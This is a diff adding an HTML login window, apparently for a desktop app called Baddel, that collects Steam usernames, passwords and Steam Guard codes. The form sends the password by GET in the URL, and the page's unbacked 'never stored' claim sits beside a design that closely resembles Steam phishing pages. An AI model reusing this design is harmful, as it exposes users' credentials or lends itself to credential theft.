@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<link rel="stylesheet" href="../../commonWeb/css/common.css">
+	<link rel="stylesheet" href="css/style.css">
+	<title>Connect with Steam</title>
+</head>
+
+<body class="apple-tv-theme">
+	<div class="container main-wrapper">
+		<header class="main-header">
+			<div class="header-content">
+				<div class="brand">
+					<img class="steam-logo-icon" src="../../commonWeb/img/icon-steam-logo.svg" alt="Steam logo">
+					<div class="brand-text">
+						<h1 class="title">Connect with Steam</h1>
+						<p class="subtitle">Securely link your account to Baddel</p>
+					</div>
+				</div>
+				<button class="close-btn" id="closeModalBtn" title="Close (Esc)">
+					<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+				</button>
+			</div>
+		</header>
+
+		<main class="main-content">
+			<form id="main-form" class="main-form" action="/" method="GET">
+				<!-- 1. LOGIN INFO (Username/Password) -->
+				<fieldset id="getLoginInfo" class="auth-view" style="display: none;">
+					<div class="view-header">
+						<h2 class="section-title">Sign In</h2>
+						<p class="section-desc">Enter your Steam credentials to continue.</p>
+					</div>
+					
+					<div class="field-group floating-label">
+						<input class="modern-input" type="text" id="step-1-username" name="username" placeholder=" " required disabled="disabled">
+						<label for="step-1-username">Steam Username</label>
+					</div>
+
+					<div class="field-group floating-label">
+						<div class="password-wrapper">
+							<input class="modern-input" type="password" id="step-1-password" name="password" placeholder=" " required disabled="disabled">
+							<label for="step-1-password">Password</label>
+							<button type="button" class="toggle-password-btn" title="Toggle visibility">
+								<svg class="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+							</button>
+						</div>
+					</div>
+
+					<!-- Security Reassurance -->
+					<div class="security-note">
+						<div class="security-item">
+							<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+							<span>Your credentials are encrypted and never stored on our servers.</span>
+						</div>
+						<div class="security-item">
+							<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+							<span>Baddel ensures your privacy and data security.</span>
+						</div>
+					</div>
+
+					<div class="error-box no-error" id="bad-password">
+						<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+						<span>The account name or password that you have entered is incorrect.</span>
+					</div>
+
+					<div class="error-box no-error" id="steamguard-expired">
+						<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+						<span>Steam Guard session expired. Please log in again.</span>
+					</div>
+				</fieldset>
+
+				<!-- 2. STEAM GUARD EMAIL -->
+				<fieldset id="steamGuardEmail" class="auth-view" style="display:none;">
+					<div class="view-header">
+						<h2 class="section-title">Check Your Email</h2>
+						<p class="section-desc">We've sent a code to your Steam-linked email address.</p>
+					</div>
+
+					<div class="field-group code-input-container">
+						<input class="modern-input steam-guard-input" type="text" id="step-1-code" name="code" maxlength="5" placeholder="ABCDE" disabled="disabled">
+						<div class="timer-display" id="emailTimer">
+							Code expires in <span class="timer-val">60s</span>
+							<span class="resend-wrapper" style="display:none;">
+								&bull; <a href="#" class="resend-link" onclick="resendCode()">Resend</a>
+							</span>
+						</div>
+					</div>
+
+					<div class="info-note">
+						<p>If you don't see it, check your spam folder or wait a minute before requesting a new one.</p>
+						<a href="https://help.steampowered.com/en/wizard/HelpWithSteamGuardCode" class="help-link" target="_blank">Need help?</a>
+					</div>
+
+					<div class="error-box no-error">
+						<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
+						<span>Invalid code. Please check and try again.</span>
+					</div>
+				</fieldset>
+
+				<!-- 3. STEAM GUARD PHONE (Code) -->
+				<fieldset id="steamGuardPhone" class="auth-view" style="display:none;">
+					<div class="view-header">
+						<h2 class="section-title">Steam Mobile App</h2>
+						<p class="section-desc">Enter the 5-character code from your Steam Mobile Authenticator.</p>
+					</div>
+
+					<div class="field-group code-input-container">
+						<input class="modern-input steam-guard-input" type="text" id="step-4-code" name="code" maxlength="5" placeholder="ABCDE" disabled="disabled">
+						<div class="timer-display" id="phoneTimer">
+							New code in <span class="timer-val">30s</span>
+							<span class="resend-wrapper" style="display:none;">
+								&bull; <a href="#" class="resend-link" onclick="resendCode()">Restart Login</a>
+							</span>
+						</div>
+					</div>
+
+					<div class="error-box no-error">
+						<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
+						<span>Invalid code. Please check and try again.</span>
+					</div>
+				</fieldset>
+
+				<!-- 4. STEAM GUARD CONFIRM (Approval Request) -->
+				<fieldset id="steamGuardConfirm" class="auth-view" style="display:none;">
+					<div class="view-header">
+						<h2 class="section-title">Approve Login in Steam App</h2>
+						<p class="section-desc">Open your Steam mobile app and tap <strong>Approve</strong>. We will continue automatically.</p>
+					</div>
+
+					<div class="waiting-container">
+						<div class="approval-visual">
+							<div class="pulse-ring"></div>
+							<div class="device-icon">
+								<svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+							</div>
+						</div>
+						<div class="waiting-status">
+							<div class="spinner-small"></div>
+							<span>Waiting for your approval. This will continue automatically.</span>
+						</div>
+					</div>
+
+					<div class="auth-options-divider no-fallback">
+						<span>OR USE ANOTHER METHOD</span>
+					</div>
+
+					<div class="auth-methods-list">
+						<a id="fallback-tag" class="auth-method-item no-fallback" href="#">
+							<div class="method-icon">
+								<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+							</div>
+							<div class="method-info">
+								<div class="method-name">Use Email Code</div>
+								<div class="method-desc">Get a code sent to your email</div>
+							</div>
+						</a>
+					</div>
+
+					<div class="support-section">
+						<div class="support-label">Need help instead?</div>
+						<a href="https://help.steampowered.com/en/wizard/HelpWithLogin" class="support-card" target="_blank">
+							<div class="method-icon">
+								<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+							</div>
+							<div class="method-info">
+								<div class="method-name">Help, I can't sign in</div>
+								<div class="method-desc">Troubleshoot login issues</div>
+							</div>
+						</a>
+					</div>
+
+					<div class="error-box no-error">
+						<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
+						<span>Confirmation failed. Please try again.</span>
+					</div>
+				</fieldset>
+
+				<!-- 5. METHOD CHOOSER -->
+				<fieldset id="chooseMethod" class="auth-view" style="display:none;">
+					<div class="view-header">
+						<h2 class="section-title">How would you like to sign in?</h2>
+						<p class="section-desc">Choose a method to link your Steam account.</p>
+					</div>
+
+					<div class="auth-methods-list" style="gap:12px;">
+						<a class="auth-method-item" href="baddel://auth/qr-start" id="chooseQR">
+							<div class="method-icon">
+								<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="3" height="3"/></svg>
+							</div>
+							<div class="method-info">
+								<div class="method-name">Scan QR Code</div>
+								<div class="method-desc">Use your Steam mobile app — no password needed</div>
+							</div>
+						</a>
+						<a class="auth-method-item" href="baddel://auth/login-form" id="choosePassword">
+							<div class="method-icon">
+								<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+							</div>
+							<div class="method-info">
+								<div class="method-name">Username &amp; Password</div>
+								<div class="method-desc">Sign in with your Steam credentials</div>
+							</div>
+						</a>
+					</div>
+				</fieldset>
+
+				<!-- 6. QR CODE LOGIN -->
+				<fieldset id="steamGuardQR" class="auth-view" style="display:none;">
+					<div class="view-header">
+						<h2 class="section-title">Scan QR Code</h2>
+						<p class="section-desc">Open the Steam app, tap on the QR icon, and scan this code for instant login.</p>
+					</div>
+
+					<div class="qr-container">
+						<div class="qr-box" id="steamQRCode">
+							<!-- QR Code will be rendered here -->
+							<div class="qr-placeholder">
+								<div class="spinner"></div>
+							</div>
+						</div>
+						<div class="qr-status">Scanning...</div>
+					</div>
+
+					<a class="text-btn" href="baddel://auth/login-form" id="switchToUserPass">Back to password</a>
+				</fieldset>
+			</form>
+		</main>
+
+		<footer class="main-footer">
+			<div class="footer-links">
+				<a class="forgot-password" href="https://help.steampowered.com/en/wizard/HelpWithLogin" target="_blank">Forgot password?</a>
+			</div>
+			<div class="footer-actions" id="actionButtons">
+				<button class="primary-btn" type="submit" form="main-form" id="continueBtn">
+					<span>Continue</span>
+					<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
+				</button>
+			</div>
+		</footer>
+	</div>
+
+	<!-- Loading Overlay -->
+	<div id="loadingOverlay" class="loading-overlay">
+		<div class="spinner-container">
+			<div class="spinner"></div>
+			<p>Authenticating...</p>
+		</div>
+	</div>
+
+	<script>
+		// --- CONFIG & STATE ---
+		const viewLookup = {
+			login: "login",
+			steamGuard: "steamguard",
+			steamAuthenticator: "steamauthenticator",
+			steamAuthenticatorConfirm: "steamauthenticator_confirm",
+			steamQR: "steam_qr",
+			chooseMethod: "choose_method",
+		};
+
+		const fieldSetsObj = {
+			loginFieldSet: document.querySelector("#getLoginInfo"),
+			loginInputs: document.querySelectorAll("#getLoginInfo input"),
+			loginError: document.querySelectorAll("#getLoginInfo .error-box"),
+
+			steamGuardFieldSet: document.querySelector("#steamGuardEmail"),
+			steamGuardInputs: document.querySelectorAll("#steamGuardEmail input"),
+			steamGuardError: document.querySelectorAll("#steamGuardEmail .error-box"),
+
+			steamAuthenticatorFieldset: document.querySelector("#steamGuardPhone"),
+			steamAuthenticatorInputs: document.querySelectorAll("#steamGuardPhone input"),
+			steamAuthenticatorError: document.querySelectorAll("#steamGuardPhone .error-box"),
+
+			steamAuthenticatorConfirmFieldset: document.querySelector("#steamGuardConfirm"),
+			steamAuthenticatorConfirmInputs: document.querySelectorAll("#steamGuardConfirm input"),
+			steamAuthenticatorConfirmError: document.querySelectorAll("#steamGuardConfirm .error-box"),
+
+			chooseMethodFieldset: document.querySelector("#chooseMethod"),
+			steamQRFieldset: document.querySelector("#steamGuardQR"),
+		};
+
+		// --- HELPERS ---
+
+		function showLoading(show = true) {
+			document.getElementById('loadingOverlay').classList.toggle('active', show);
+		}
+
+		function handleEnablingInputs(inputs) {
+			for (let input of inputs) {
+				input.disabled = false;
+			}
+		}
+
+		function togglePasswordVisibility() {
+			const input = document.getElementById("step-1-password");
+			const btn = document.querySelector(".toggle-password-btn");
+			if (input.type === "password") {
+				input.type = "text";
+				btn.classList.add("visible");
+			} else {
+				input.type = "password";
+				btn.classList.remove("visible");
+			}
+		}
+
+		// --- TIMERS ---
+		function startTimer(duration, displayId) {
+			let timer = duration, minutes, seconds;
+			const display = document.querySelector(`#${displayId} .timer-val`);
+			const resendWrapper = document.querySelector(`#${displayId} .resend-wrapper`);
+			const interval = setInterval(() => {
+				minutes = parseInt(timer / 60, 10);
+				seconds = parseInt(timer % 60, 10);
+
+				seconds = seconds < 10 ? "0" + seconds : seconds;
+				display.textContent = (minutes > 0 ? minutes + ":" : "") + seconds + "s";
+
+				if (--timer < 0) {
+					clearInterval(interval);
+					display.textContent = "Expired";
+					display.classList.add('expired');
+					if (resendWrapper) resendWrapper.style.display = 'inline';
+				}
+			}, 1000);
+			return interval;
+		}
+
+		function resendCode() {
+			const url = new URL(window.location.href);
+			url.searchParams.set('view', 'login');
+			url.searchParams.delete('errored');
+			window.location.href = url.href;
+		}
+
+		// --- MAIN LOGIC ---
+
+		function handleParamsAndForms() {
+			const urlParams = new URLSearchParams(window.location.search);
+			const formElement = document.querySelector("#main-form");
+			const forgotPasswordButtonElement = document.querySelector(".forgot-password");
+			const continueBtn = document.getElementById('continueBtn');
+
+			let view = urlParams.get("view");
+			let errored = urlParams.get("errored") == 'true';
+			let act, loc, inp, err = null;
+
+			// Reset all views
+			document.querySelectorAll('.auth-view').forEach(v => v.style.display = 'none');
+
+			switch (view) {
+				case viewLookup.steamGuard:
+					loc = fieldSetsObj.steamGuardFieldSet;
+					inp = fieldSetsObj.steamGuardInputs;
+					act = "/two_factor_mail_finished";
+					err = errored ? fieldSetsObj.steamGuardError : null;
+					startTimer(60, 'emailTimer');
+					break;
+				case viewLookup.steamAuthenticator:
+					loc = fieldSetsObj.steamAuthenticatorFieldset;
+					inp = fieldSetsObj.steamAuthenticatorInputs;
+					act = "/two_factor_mobile_finished";
+					err = errored ? fieldSetsObj.steamAuthenticatorError : null;
+					startTimer(30, 'phoneTimer');
+					break;
+				case viewLookup.steamAuthenticatorConfirm:
+					loc = fieldSetsObj.steamAuthenticatorConfirmFieldset;
+					inp = fieldSetsObj.steamAuthenticatorConfirmInputs;
+					act = "/two_factor_confirm_finished";
+					err = errored ? fieldSetsObj.steamAuthenticatorConfirmError : null;
+					continueBtn.querySelector('span').textContent = 'Confirm on Phone';
+					break;
+				case viewLookup.chooseMethod:
+					loc = fieldSetsObj.chooseMethodFieldset;
+					inp = [];
+					act = "/login_finished";
+					continueBtn.style.display = 'none';
+					break;
+				case viewLookup.steamQR:
+					loc = fieldSetsObj.steamQRFieldset;
+					inp = [];
+					act = "/login_finished";
+					continueBtn.style.display = 'none';
+					break;
+				case viewLookup.login:
+				default:
+					loc = fieldSetsObj.loginFieldSet;
+					inp = fieldSetsObj.loginInputs;
+					act = "/login_finished";
+					err = errored ? fieldSetsObj.loginError : null;
+					forgotPasswordButtonElement.style.display = "block";
+					break;
+			}
+
+			formElement.action = act;
+			handleEnablingInputs(inp);
+
+			if (err) {
+				for (let e of err) e.classList.remove("no-error");
+			}
+
+			loc.style.display = "block";
+			loc.classList.add('fade-in');
+
+			// Fallback logic
+			if (view == viewLookup.steamAuthenticatorConfirm) {
+				let fallbackMeth = urlParams.get("fallbackMethod");
+				let fallbackStr = urlParams.get("fallbackMsg");
+				if (fallbackMeth) {
+					let fallbackTag = document.getElementById("fallback-tag");
+					let fallbackHolder = fallbackTag; // Using the tag itself now
+					let curr_href = new URL(window.location.href);
+
+					curr_href.searchParams.set('view', fallbackMeth);
+					curr_href.searchParams.set('view-msg', fallbackStr);
+					fallbackTag.href = curr_href.href;
+
+					let niceText = "Use a fallback method";
+					let methodTitle = "Use a different method";
+					let methodDesc = "Try another authentication way";
+
+					if (fallbackMeth == viewLookup.steamGuard) {
+						methodTitle = "Use Email Code";
+						methodDesc = "Get a code sent to your email";
+					} else if (fallbackMeth == viewLookup.steamAuthenticator) {
+						methodTitle = "Use Mobile Code";
+						methodDesc = "Enter the code from your app";
+					}
+
+					fallbackTag.querySelector('.method-name').textContent = methodTitle;
+					fallbackTag.querySelector('.method-desc').textContent = methodDesc;
+					fallbackTag.classList.remove("no-fallback");
+					document.querySelector('.auth-options-divider').classList.remove('no-fallback');
+				}
+			}
+
+			// Login specific errors
+			if (view == viewLookup.login && err) {
+				let badPass = document.getElementById("bad-password");
+				let expiredError = document.getElementById("steamguard-expired");
+				let expired = urlParams.get("expired");
+				
+				if (expired == "true") {
+					expiredError.classList.remove("no-error");
+					badPass.classList.add("no-error");
+				} else {
+					badPass.classList.remove("no-error");
+					expiredError.classList.add("no-error");
+				}
+			}
+		}
+
+		// --- INITIALIZATION ---
+
+		document.addEventListener("DOMContentLoaded", () => {
+			handleParamsAndForms();
+
+			// Restore saved username
+			const savedUser = localStorage.getItem('steam_username_tmp');
+			if (savedUser) {
+				const userInp = document.getElementById('step-1-username');
+				if (userInp) userInp.value = savedUser;
+			}
+
+			// Save username as they type
+			document.getElementById('step-1-username')?.addEventListener('input', (e) => {
+				localStorage.setItem('steam_username_tmp', e.target.value);
+			});
+
+			// Event Listeners
+			document.querySelector(".toggle-password-btn")?.addEventListener("click", togglePasswordVisibility);
+			
+			document.getElementById('main-form').addEventListener('submit', () => {
+				showLoading(true);
+			});
+
+			document.getElementById('closeModalBtn').addEventListener('click', () => {
+				// Electron window close signal
+				window.close();
+			});
+
+			// ESC to close
+			window.addEventListener('keydown', (e) => {
+				if (e.key === 'Escape') window.close();
+			});
+		});
+	</script>
+</body>
+
+</html>
